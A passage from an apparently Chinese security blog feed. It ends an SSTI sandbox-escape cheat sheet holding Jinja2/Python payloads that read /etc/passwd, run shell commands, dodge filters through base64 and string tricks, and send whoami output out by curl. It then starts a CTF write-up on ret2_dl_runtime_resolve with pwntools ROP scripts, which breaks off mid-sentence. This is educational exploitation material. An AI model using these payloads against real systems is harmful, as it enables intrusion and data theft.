().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)&lt;type &apos;file&apos;&gt;&gt;&gt;&gt; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(&apos;/etc/passwd&apos;).read()&apos;##\n# User Database\n# \n# Note that this file is consulted directly only when the system is running\n# in single-user mode....&gt;&gt;&gt; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()&apos;##\n# User Database\n# \n# Note that this file is consulted directly only when the system is running\n# in single-user mode.... g属性的利用保存全局变量的g属性：g: global。g对象解释： 就是为了保存用户一些自定义参数下面我们试一下，怎么样构造出’id’。先构造%1234567891011test.html: &#123;% set pc = g|lower %&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;pc&#125;&#125;&lt;/h1&gt; &#123;% set pc = g|lower|list %&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;pc&#125;&#125;&lt;/h1&gt; &#123;% set pc = g|lower|list|first %&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;pc&#125;&#125;&lt;/h1&gt; &#123;% set pc = g|lower|list|first|urlencode %&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;pc&#125;&#125;&lt;/h1&gt; &#123;% set pc = g|lower|list|first|urlencode|first %&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;pc&#125;&#125;&lt;/h1&gt; 运行后123456out:&lt;flask.g of &apos;run&apos;&gt;[&apos;&lt;&apos;, &apos;f&apos;, &apos;l&apos;, &apos;a&apos;, &apos;s&apos;, &apos;k&apos;, &apos;.&apos;, &apos;g&apos;, &apos; &apos;, &apos;o&apos;, &apos;f&apos;, &apos; &apos;, &quot;&apos;&quot;, &apos;r&apos;, &apos;u&apos;, &apos;n&apos;, &quot;&apos;&quot;, &apos;&gt;&apos;]&lt;%3C% 构造获得c123456789101112131415161718test.html: &#123;%set c=dict(c=1).keys()%&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;c&#125;&#125;&lt;/h1&gt; &#123;%set c=dict(c=1,b=2).keys()|reverse|first%&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;c&#125;&#125;&lt;/h1&gt; &#123;%set c=dict(c=1,b=2).keys()|first%&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;c&#125;&#125;&lt;/h1&gt; &#123;%set c=dict(c=1).keys()|reverse|first%&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;c&#125;&#125;&lt;/h1&gt; &#123;%set c=dict(c=1).keys()|first%&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;c&#125;&#125;&lt;/h1&gt;out:dict_keys([&apos;c&apos;])bccc 获取’id’并且执行命令123456789101112131415161718192021test.html: &#123;%set c=dict(c=1).keys()|first%&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;c&#125;&#125;&lt;/h1&gt; &#123;%set udl=dict(a=pc,c=c).values() %&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;udl&#125;&#125;&lt;/h1&gt; &#123;%set udl=dict(a=pc,c=c).values()|join %&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;udl&#125;&#125;&lt;/h1&gt; &#123;% set udl2=udl%(105) + udl%(100) %&#125; &lt;h1 style = &apos;font-style:italic&apos;&gt;&#123;&#123;udl2&#125;&#125;&lt;/h1&gt; &#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__==&apos;catch_warnings&apos; %&#125; &#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;&quot; + udl2 + &quot; &apos;).read()&quot;) &#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125;out:dict_values([&apos;%&apos;, &apos;c&apos;])%ciduid=501(xxhx) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98... 过滤中括号当中括号[]被过滤掉时，调用getitem()函数直接替换；调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值替换；123456789# 原型&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)# __getitem__()替换中括号[]&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__(&apos;__builtins__&apos;).__getitem__(&apos;__import__&apos;)(&apos;os&apos;).system(&apos;calc&apos;)# pop()替换中括号[]，结合__getitem__()利用&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.__globals__.pop(&apos;__builtins__&apos;).pop(&apos;__import__&apos;)(&apos;os&apos;).system(&apos;calc&apos;)注意pop 过滤globals当globals被禁用时，可以用func_globals直接替换；使用getattribute(‘globa’+’ls‘)；如：12345678910原型是调用__globals__&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)如果过滤了__globals__，可直接替换为func_globals&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)__getattribute__当类被调用的时候，无条件进入此函数。也可以通过拼接字符串得到方式绕过&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&quot;__glo&quot;+&quot;bals__&quot;)[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;) 过滤mro或bases或base两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别：12345678910111213&apos;&apos;.__class__.__mro__[2][].__class__.__mro__[1]&#123;&#125;.__class__.__mro__[1]().__class__.__mro__[1][].__class__.__mro__[-1]&#123;&#125;.__class__.__mro__[-1]().__class__.__mro__[-1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0][].__class__.__base__().__class__.__base__&#123;&#125;.__class__.__base__ base64编码对关键字进行base64编码可绕过一些明文检测机制：1234567891011python2&gt;&gt;&gt; __builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).system(&apos;ls&apos;)Applicationspython3 import base64In [179]: __builtins__.__dict__[str(base64.b64decode(&apos;X19pbXBvcnRfXw==&apos;),&apos;utf-8&apos;)](str(base64.b64decode(&apos;b3M ...: =&apos;),&apos;utf-8&apos;)).system(&apos;ls&apos;)1.png README.md app.py requirements.txtDockerfile __pycache__ docker-compose.ymlOut[179]: 0 字符串拼接凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。 字节翻转假设要读 a的time属性 : a[‘time’] ,但是代码中的time字符串全部被过滤了1234s = &quot;emit&quot;s = s [::-1]&gt;&gt;&gt; print stime 过滤下划线1&#123;&#123; &apos;&apos;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 过滤花括号12345用&#123;%%&#125;标记&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://127.0.0.1:7999/?i=`whoami`&apos;).read()==&apos;p&apos; %&#125;1&#123;% endif %&#125;这样会没有回显,考虑带外或者盲注用&#123;%print%&#125;标记,有回显&#123;%print config%&#125; 0x05 后记 早已忘记多少空虚总要让你梦里占据挥之不去始终等你温暖我长留心中，早已度过多少伤心此际别说后悔过去彼此都算一生只有一次爱情无终。 —《太傻》]]></content>
      <tags>
        <tag>模版注入</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高级rop之ret2_dl_runtime_resolve]]></title>
    <url>%2F2020%2F09%2F28%2F1%2F</url>
    <content type="text"><![CDATA[昔我往矣，杨柳依依；今我来思，雨雪霏霏。 0x01 GOT/PLT之延迟绑定 之前有篇文章讲到了GOT表和PLT表以及延迟绑定，稍微回顾一下。一个函数的动态执行过程如下，以read函数为例子 1234567891011[-------------------------------------code-------------------------------------]=&gt; 0x8048390 &lt;read@plt&gt;: jmp DWORD PTR ds:0x804a004 | 0x8048396 &lt;read@plt+6&gt;: push 0x8 | 0x804839b &lt;read@plt+11&gt;: jmp 0x8048370 | 0x80483a0 &lt;__gmon_start__@plt&gt;: jmp DWORD PTR ds:0x804a008 | 0x80483a6 &lt;__gmon_start__@plt+6&gt;: push 0x10 |-&gt; 0x8048396 &lt;read@plt+6&gt;: push 0x8 0x804839b &lt;read@plt+11&gt;: jmp 0x8048370 0x80483a0 &lt;__gmon_start__@plt&gt;: jmp DWORD PTR ds:0x804a008 0x80483a6 &lt;__gmon_start__@plt+6&gt;: push 0x10[------------------------------------stack-------------------------------------] 这是read@plt表，第一步jmp 对应的GOT表的一项，然后0x804a008这个GOT表处，又保存0x8048396，有跳到了&lt;read@plt+6&gt;，这里push 0x8，这个0x08是write函数在.rel.plt中的偏移量，中间插一脚，简单看一下.rel.plt的组成，尤其是偏移量和类型，后面再细说。 12345678pwn@pwn-PC:~/Desktop$ readelf -r bed0c68697f74e649f3e1c64ff7838b8 重定位节 &apos;.rel.plt&apos; 位于偏移量 0x318 含有 5 个条目： 偏移量 信息 类型 符号值 符号名称0804a000 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.00804a004 00000207 R_386_JUMP_SLOT 00000000 read@GLIBC_2.00804a008 00000307 R_386_JUMP_SLOT 00000000 __gmon_start__0804a00c 00000407 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.00804a010 00000507 R_386_JUMP_SLOT 00000000 write@GLIBC_2.0 然后继续jmp到0x8048370也就是plt[0]，下面两个是push got[1]jmp *got[2]其中：got[1]：address of link_map object也就是本ELF的link_map数据结构描述符地址。got[2]：address of _dl_runtime_resolve function ，也就是_dl_runtime_resolve函数的地址，来得到真正的函数地址，回写到对应的got表位置中。另外，got[0]：address of .dynamic section 也就是本ELF动态段(.dynamic段）的装载地址 123gdb-peda$ x /2wi 0x8048370 0x8048370: push DWORD PTR ds:0x8049ff8 0x8048376: jmp DWORD PTR ds:0x8049ffc 通过got[2]执行_dl_runtime_resolve函数，可以把read函数的真实地址写在相应的got表中，然后去调用。回顾完了延迟绑定的过程，是不是有些肤浅？目前我们只是知道了这个延迟绑定的大体过程并不知道其中的细节，比如怎么找到真实函数地址，又是怎么将真实函数地址绑定到相应的got表。那么下面我们就对以上两个问题就行探究，来深入了解一下_dl_runtime_resolve这个函数到底是做了什么？ 0x02 GOT/PLT之_dl_runtime_resolve 在开始之前我们应该了解一下ELF中我们需要用到的结构：Section Header Table（段表）、.rel.plt（重定向表）、.dynsym（动态符号表）、.dynstr（动态字符串表）。 Section Header Table 段表是保存段的基本属性结构，也是 ELF 文件中除了文件头以外最重要的结构，描述了 ELF 的各个段的信息，如段名、长度、文件中的偏移、读写权限等。 123456789101112typedef struct &#123; Elf32_Word sh_name; /* Section name (string tbl index) */ Elf32_Word sh_type; /* Section type */ Elf32_Word sh_flags; /* Section flags */ Elf32_Addr addr; Elf32_Off sh_offset; Elf32_Word sh_size; Elf32_Word sh_link; Elf32_Word sh_info; Elf32_Word sh_addralign; Elf32_Word sh_entsize;&#125; Elf32_Shdr; 段表是以 Elf32_Shdr 结构体为元素的数组，数组的个数等于元素的个数，每个 Elf32_Shdr 对应一个段， Elf32_Shdr 也成为段描述符。来看一下程序中的Section Header Table 12345678910111213141516171819202122232425262728293031323334353637pwn@pwn-PC:~/Desktop$ readelf -S pwn200 共有 28 个节头，从偏移量 0x1134 开始：节头： [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 08048188 000188 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 080481ac 0001ac 00002c 04 A 5 0 4 [ 5] .dynsym DYNSYM 080481d8 0001d8 000090 10 A 6 1 4 [ 6] .dynstr STRTAB 08048268 000268 000064 00 A 0 0 1 [ 7] .gnu.version VERSYM 080482cc 0002cc 000012 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 080482e0 0002e0 000020 00 A 6 1 4 [ 9] .rel.dyn REL 08048300 000300 000018 08 A 5 0 4 [10] .rel.plt REL 08048318 000318 000028 08 A 5 12 4 [11] .init PROGBITS 08048340 000340 00002e 00 AX 0 0 4 [12] .plt PROGBITS 08048370 000370 000060 04 AX 0 0 16 [13] .text PROGBITS 080483d0 0003d0 00024c 00 AX 0 0 16 [14] .fini PROGBITS 0804861c 00061c 00001a 00 AX 0 0 4 [15] .rodata PROGBITS 08048638 000638 000008 00 A 0 0 4 [16] .eh_frame_hdr PROGBITS 08048640 000640 00003c 00 A 0 0 4 [17] .eh_frame PROGBITS 0804867c 00067c 0000ec 00 A 0 0 4 [18] .ctors PROGBITS 08049f14 000f14 000008 00 WA 0 0 4 [19] .dtors PROGBITS 08049f1c 000f1c 000008 00 WA 0 0 4 [20] .jcr PROGBITS 08049f24 000f24 000004 00 WA 0 0 4 [21] .dynamic DYNAMIC 08049f28 000f28 0000c8 08 WA 6 0 4 [22] .got PROGBITS 08049ff0 000ff0 000004 04 WA 0 0 4 [23] .got.plt PROGBITS 08049ff4 000ff4 000020 04 WA 0 0 4 [24] .data PROGBITS 0804a014 001014 000008 00 WA 0 0 4 [25] .bss NOBITS 0804a020 00101c 00002c 00 WA 0 0 32 [26] .comment PROGBITS 00000000 00101c 00002a 01 MS 0 0 1 [27] .shstrtab STRTAB 00000000 001046 0000ec 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), p (processor specific) 可以清晰的看到段内的每一个name，那么就引出来下几个概念.rel.plt（重定向表）、.dynsym（动态符号表）、.dynstr（动态字符串表）。 .rel.plt（重定向表） .rel.plt也就是ELF REL Relocation Table，它是对函数进行修正。还有另一个.rel.dyn ，它包含了动态链接的二进制文件中需要重定位的变量的信息，对数据进行修正。这些信息都是在加载的时候必须完全确定。那么链接器是怎么知道哪些指令是要被调整的呢?这些指令的哪些部分需要被调整?应该怎么调整?这都是通过重定位表来做的。通俗来说它的作用就是在延迟绑定时，让链接器知道谁和谁进行绑定。先来看其结构 1234typedef struct&#123;Elf32_Addr r_offset;Elf32_Word r_info; &#125;Elf32_Rel; Elf32_Rel中的r_offset是重定向的偏移，保存的某个函数的GOT表，比如elf.got[‘write’]；r_info则是重定向入口的类型和符号，低 8 位表示重定位入口的类型，高 24 位表示重定位入口的符号在符号表中的下标。来看一下程序中的.rel.plt表。 1234567LOAD:08048318 ; ELF JMPREL Relocation TableLOAD:08048318 Elf32_Rel &lt;804A000h, 107h&gt; ; R_386_JMP_SLOT setbufLOAD:08048320 Elf32_Rel &lt;804A004h, 207h&gt; ; R_386_JMP_SLOT readLOAD:08048328 Elf32_Rel &lt;804A008h, 307h&gt; ; R_386_JMP_SLOT __gmon_start__LOAD:08048330 Elf32_Rel &lt;804A00Ch, 407h&gt; ; R_386_JMP_SLOT __libc_start_mainLOAD:08048338 Elf32_Rel &lt;804A010h, 507h&gt; ; R_386_JMP_SLOT writeLOAD:08048338 LOAD ends 以write为例，0x08048338处的Elf32_Rel &lt;804A010h, 507h&gt; 其形式如下 1234typedef struct&#123;Elf32_Addr r_offset = 0x804A010h ;Elf32_Word r_info = 0x507h; &#125;Elf32_Rel; 其中重定向的入口类型就是0x7（R_386_JUMP_SLOT）自行百度；重定向入口的符号就是r_info&gt;&gt;8 =&gt; 0x507&gt;&gt;8 =&gt; 0101 =&gt; 0x5，这就是动态符号表的下标。 .dynsym（动态符号表） 其中只保存了动态链接相关的符号，还有一个表.symtab表，这个往往保存了所有的符号，包含.dynsym中的符号。其结构如下 123456789typedef struct&#123; Elf32_Word st_name; //符号名，是相对.dynstr起始的偏移 Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; //对于导入函数符号而言，它是0x12 unsigned char st_other; Elf32_Section st_shndx;&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0 这里有两点需要注意：一、len(Elf32_Sym) == 0x10，因此它的下表就是[num/0x10]；二、st_name这个参数是符号名，保存的是相对.dynstr起始的偏移量，也就是st_name表示在.dynstr的偏移地址，从而找到.dynstr中某个字符串。继续来看一下程序中的.dynsym表。 12345678910111213LOAD:080481D8 ; ELF Symbol TableLOAD:080481D8 Elf32_Sym &lt;0&gt;LOAD:080481E8 Elf32_Sym &lt;offset aSetbuf - offset byte_8048268, 0, 0, 12h, 0, 0&gt; ; &quot;setbuf&quot;LOAD:080481F8 Elf32_Sym &lt;offset aRead - offset byte_8048268, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;LOAD:08048208 Elf32_Sym &lt;offset aGmonStart - offset byte_8048268, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;LOAD:08048218 Elf32_Sym &lt;offset aLibcStartMain - offset byte_8048268, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;LOAD:08048218 0&gt;LOAD:08048228 Elf32_Sym &lt;offset aWrite - offset byte_8048268, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;LOAD:08048238 Elf32_Sym &lt;offset aStdout - offset byte_8048268, offset stdout, 4, \ ; &quot;stdout&quot;LOAD:08048238 11h, 0, 19h&gt;LOAD:08048248 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_8048268, \ ; &quot;_IO_stdin_used&quot;LOAD:08048248 offset _IO_stdin_used, 4, 11h, 0, 0Fh&gt;LOAD:08048258 Elf32_Sym &lt;offset aStdin - offset byte_8048268, offset stdin, 4, 11h, \ ; &quot;stdin&quot; 依然以write函数为例，其Elf32_Sym为： 123456789typedef struct&#123; Elf32_Word st_name = offset aWrite - offset byte_8048268; Elf32_Addr st_value = 0; Elf32_Word st_size = 0; unsigned char st_info = 0x12; unsigned char st_other = 0; Elf32_Section st_shndx = 0;&#125;Elf32_Sym; .dynstr（动态字符串表） 用来存储.dynsym段符号对应的符号名，这个就是最终目的地。来看一下程序中的.dynstr表。 1234567891011121314151617LOAD:08048268 ; ELF String TableLOAD:08048268 byte_8048268 db 0 ; DATA XREF: LOAD:080481E8↑oLOAD:08048268 ; LOAD:080481F8↑o ...LOAD:08048269 aGmonStart db &apos;__gmon_start__&apos;,0 ; DATA XREF: LOAD:08048208↑oLOAD:08048278 aLibcSo6 db &apos;libc.so.6&apos;,0LOAD:08048282 aIoStdinUsed db &apos;_IO_stdin_used&apos;,0 ; DATA XREF: LOAD:08048248↑oLOAD:08048291 aStdin db &apos;stdin&apos;,0 ; DATA XREF: LOAD:08048258↑oLOAD:08048297 aRead db &apos;read&apos;,0 ; DATA XREF: LOAD:080481F8↑oLOAD:0804829C aStdout db &apos;stdout&apos;,0 ; DATA XREF: LOAD:08048238↑oLOAD:080482A3 aSetbuf db &apos;setbuf&apos;,0 ; DATA XREF: LOAD:080481E8↑oLOAD:080482AA aLibcStartMain db &apos;__libc_start_main&apos;,0LOAD:080482AA ; DATA XREF: LOAD:08048218↑oLOAD:080482BC aWrite db &apos;write&apos;,0 ; DATA XREF: LOAD:08048228↑oLOAD:080482C2 aGlibc20 db &apos;GLIBC_2.0&apos;,0LOAD:080482CC dd 20000h, 2, 20002h, 10002h, 2, 10001h, 2 dup(10h), 0LOAD:080482F0 dd 0D696910h, 20000h, 5Ah, 0LOAD:08048300 ; ELF REL Relocation Table 以wrie函数为例子，偏移st_name即可找到LOAD:080482BC aWrite db ‘write’,0 ; DATA XREF: LOAD:08048228↑o。 寻找时的过程 还有另外提一个概念，它是.dynamic（动态节），它里面ELF的依赖于哪些动态库、动态符号节信息、动态字符串节信息的信息，其结构如下： 12345678typedef struct &#123; Elf32_Sword d_tag; /*d_tag 的取值决定了该如何解释 d_un*/ union &#123; Elf32_Word d_val; Elf32_Addr d_ptr; /*程序的虚拟地址*/ &#125; d_un;&#125; Elf32_Dyn;extern Elf32_Dyn_DYNAMIC[]; 经过上述的介绍，可以知道这个节中包含了.rel.plt（重定向表）、.dynsym（动态符号表）、.dynstr（动态字符串表），来看下程序中的.dynamic（动态节）。 12345678910111213141516171819202122LOAD:08049F28 stru_8049F28 Elf32_Dyn &lt;1, &lt;10h&gt;&gt; ; DATA XREF: LOAD:080480BC↑oLOAD:08049F28 ; .got.plt:08049FF4↓oLOAD:08049F28 ; DT_NEEDED libc.so.6LOAD:08049F30 Elf32_Dyn &lt;0Ch, &lt;8048340h&gt;&gt; ; DT_INITLOAD:08049F38 Elf32_Dyn &lt;0Dh, &lt;804861Ch&gt;&gt; ; DT_FINILOAD:08049F40 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASHLOAD:08049F48 Elf32_Dyn &lt;5, &lt;8048268h&gt;&gt; ; DT_STRTAB /*.dynstr（动态字符串表）*/LOAD:08049F50 Elf32_Dyn &lt;6, &lt;80481D8h&gt;&gt; ; DT_SYMTAB /*.dynsym（动态符号表）*/LOAD:08049F58 Elf32_Dyn &lt;0Ah, &lt;64h&gt;&gt; ; DT_STRSZLOAD:08049F60 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt; ; DT_SYMENTLOAD:08049F68 Elf32_Dyn &lt;15h, &lt;0&gt;&gt; ; DT_DEBUGLOAD:08049F70 Elf32_Dyn &lt;3, &lt;8049FF4h&gt;&gt; ; DT_PLTGOTLOAD:08049F78 Elf32_Dyn &lt;2, &lt;28h&gt;&gt; ; DT_PLTRELSZLOAD:08049F80 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt; ; DT_PLTRELLOAD:08049F88 Elf32_Dyn &lt;17h, &lt;8048318h&gt;&gt; ; DT_JMPREL /*.rel.plt（重定向表）*/LOAD:08049F90 Elf32_Dyn &lt;11h, &lt;8048300h&gt;&gt; ; DT_RELLOAD:08049F98 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt; ; DT_RELSZLOAD:08049FA0 Elf32_Dyn &lt;13h, &lt;8&gt;&gt; ; DT_RELENTLOAD:08049FA8 Elf32_Dyn &lt;6FFFFFFEh, &lt;80482E0h&gt;&gt; ; DT_VERNEEDLOAD:08049FB0 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUMLOAD:08049FB8 Elf32_Dyn &lt;6FFFFFF0h, &lt;80482CCh&gt;&gt; ; DT_VERSYMLOAD:08049FC0 Elf32_Dyn &lt;0&gt; ; DT_NULL 画重点：LOAD:08049F48 Elf32_Dyn &lt;5, &gt; ; DT_STRTAB /*.dynstr（动态字符串表）*/LOAD:08049F50 Elf32_Dyn &lt;6, &gt; ; DT_SYMTAB /*.dynsym（动态符号表）*/LOAD:08049F88 Elf32_Dyn &lt;17h, &gt; ; DT_JMPREL /*.rel.plt（重定向表）*/现在我们看一下具体的过程。这就要从push got[1]开始，通过前面的了解，got[1]是link_map数据结构描述符的地址，执行完这条压栈命令，关注两点。第一、这个地址保存的是什么？第二、这个地址有什么用？第二、此时栈中的内容got[1]处保存的是link_map数据结构描述符的地址，从link_map又可以找到.dynamic表，结合上述的了解，有了.dynamic表就很方便的找到read字符串表（以read函数来举例），如图所示： 前两个问题解决了，再来看栈中的内容，分别是0x8048396 &lt;read@plt+6&gt;: push 0x80x8048370: push DWORD PTR ds:0x8049ff8这两个压栈的操作产生的结果。指令继续执行，0x8048376: jmp DWORD PTR ds:0x8049ffc 1234567gdb-peda$ xinfo 0x8049ffc0x8049ffc --&gt; 0xf7fee700 (&lt;_dl_runtime_resolve&gt;: push eax)Virtual memory mapping:Start : 0x08049000End : 0x0804a000Offset: 0xffcPerm : r--p 执行_dl_runtime_resolve函数，看一下原型：_dl_runtime_resolve(link_map_obj, reloc_index)，这里的link_map_obj，reloc_index就是栈里面的两个值，通过link_map和偏移量最终可以找到read函数的。目前我们已经清楚了通过传入两个形参，_dl_runtime_resolve函数进行绑定操作，那么这是怎么一步一步的进行绑定的呢？上面也提到了一部分，通过link_map_obj可以找到.dynamic表，继续往下看，详细讨论一下具体的过程。既然找到了.dynamic表，那么.rel.plt（重定向表）、.dynsym（动态符号表）、.dynstr（动态字符串表）也就有了，先找到这三个表的起始地址。 图中的1，2，3处分别代表.dynstr、.dynsym和.rel.plt，使用objdump可以验证一下，其实在ida中或许能够更直接地找到DT_STRTAB、DT_SYMTAB和DT_JMPREL。 在回顾中我们提到过，这个0x08是write函数在.rel.plt中的偏移量，所以0x8048318+0x08就能找到read函数的Elf32_Rel。 12gdb-peda$ x /2wx 0x8048318+0x08 0x8048320: 0x0804a004 0x00000207 根据前面的知识，可以知道 1234typedef struct&#123;Elf32_Addr r_offset = 0x804A010h ; //这里也是对应的got表地址Elf32_Word r_info = 0x207h; &#125;Elf32_Rel 现在就是通过r_info来继续寻找，知道找到read函数，然后把地址绑定r_offset指向的got表的单元中。r_info是分为两部分，.dynsym的下标在前八位，那么index = 0x207 &gt;&gt; 8 = 0x2，然后以0x080481d8为起始地址，Elf32_Sym[0x2]来找到read函数的Elf32_Sym。 12gdb-peda$ x /wx 0x080481d8+0x2*0x100x80481f8: 0x0000002f 一个结构体长度是0x10，而且通过前面的知识可以知道0x2f就是st_name的值，进而0x08048268+0x2f就可以找到read的字符串。这里需要提一点，这个节是以\x00作为开始和结尾的，而且中间没个字符串也可以以\x00作为间隔。 1234gdb-peda$ x /wx 0x08048268+0x2f0x8048297: 0x64616572gdb-peda$ x /s 0x08048268+0x2f0x8048297: &quot;read&quot; 到了这里寻找工作就完毕了，_dl_runtime_resolve中调用_dl_fixup函数完成函数的延迟绑定，也就是将函数的真实地址写入对应的got表中。再来简单看一下_dl_fixup是怎么完成的，其实就是将我们上面分析的过程自动化了，下面是其中一些主要函数。 123456789101112131415_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)&#123; // 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); // 然后通过reloc-&gt;r_info找到.dynsym中对应的条目 const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; // 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7 assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); // 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址 result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); // value为libc基址加上要解析函数的偏移地址，也即实际地址 value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0); // 最后把value写入相应的GOT表条目中 return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);&#125; 0x03 XDCTF2015·pwn200123456789101112131415#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;int vuln()&#123; char buf[80]; setbuf(stdin, buf); return read(0, buf, 256);&#125;int main(int argc, char** argv)&#123; char* welcome = &quot;Welcome to XDCTF2015 ~!\n&quot;; setbuf(stdout, welcome) write(1, welcome, strlen(welcome)); vuln(); return 0;&#125; 可以在攻防世界中找到这个题目。对于我这个萌新，每次看ctfwiki上大佬的rop链都很懵，所以分享一下自己理解步骤。栈迁移的部分就采用上一篇文章的第一种写法。 1234567891011121314151617181920212223242526from pwn import *context.log_level = &apos;debug&apos;context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]elf = ELF(&apos;bed0c68697f74e649f3e1c64ff7838b8&apos;)r = process(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)offset = 108 ## find stack overflow lengthbss_addr = elf.bss()leave_ret = 0x08048481 ## ROPgadget --binary bed0c68697f74e649f3e1c64ff7838b8 --only &apos;leave|ret&apos;read_plt = elf.plt[&apos;read&apos;]r.recvuntil(&apos;Welcome to XDCTF2015~!\n&apos;)## stack pivoting to bss segment## new stack size is 0x800stack_size = 0x800base_stage = bss_addr + stack_size## padding 108 rop.raw(&apos;a&apos; * offset)## faker_ebp1rop.raw(base_stage)### stack pivoting, set esp = base_stagerop.raw(flat(read_plt,leave_ret,0, base_stage, 100))## print rop.dump()##gdb.attach(r)r.sendline(rop.chain()) 下面开始ROP链的一点心得分享：先构造write函数ROP链，将”/bin/sh”打印出来，然后接下来的递进操作都是根据这个为基础开展。 1234567891011## write cmd=&quot;/bin/sh&quot;rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)sh = &quot;/bin/sh&quot;rop.raw(base_stage)rop.write(1, base_stage + 80, len(sh))rop.raw(&apos;a&apos; * (80 - len(rop.chain())))rop.raw(sh)rop.raw(&apos;a&apos; * (100 - len(rop.chain())))##gdb.attach(r)r.sendline(rop.chain())r.interactive() 根据前面的知识，我们可以知道，write函数是通过延迟绑定来找到的，捋一下寻找的路线：push reloc_offset -&gt; push link_map_obj -&gt; 